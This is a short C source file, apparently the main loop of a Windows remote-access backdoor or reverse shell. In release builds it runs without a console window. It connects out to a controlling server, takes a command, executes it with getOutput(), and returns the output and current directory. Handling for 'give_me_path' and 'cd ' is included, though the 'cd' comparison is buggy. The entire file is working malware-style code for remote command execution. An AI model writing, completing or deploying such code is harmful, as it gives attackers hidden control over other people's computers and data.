#include <windows.h>

#include "connection.h"
#include "processMgmt.h"

#ifdef DEBUG
#include <stdio.h>
int main(int argc, char* argv[]) 
#else
int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow)
#endif
{
    initConnection();
    char* cwd = getCwd();
    char* command = getData();
    puts(command);
    if(command == NULL)
    {
        // Passing
    }
    else if (strcmp(command, "give_me_path") == 0)
        sendData("", cwd);
    else if( strcmp(command, "cd ") == 0 )
    {
        free(cwd);
        cwd = getCwd();

        SetCurrentDirectory(command+3);
        sendData("", cwd);
    }
    else {
        printf("Getting Output of: %s\n", command);
        char* output = getOutput(command);
        sendData(output, cwd);
    }
    free(cwd);
    free(command);

    return 0;
}
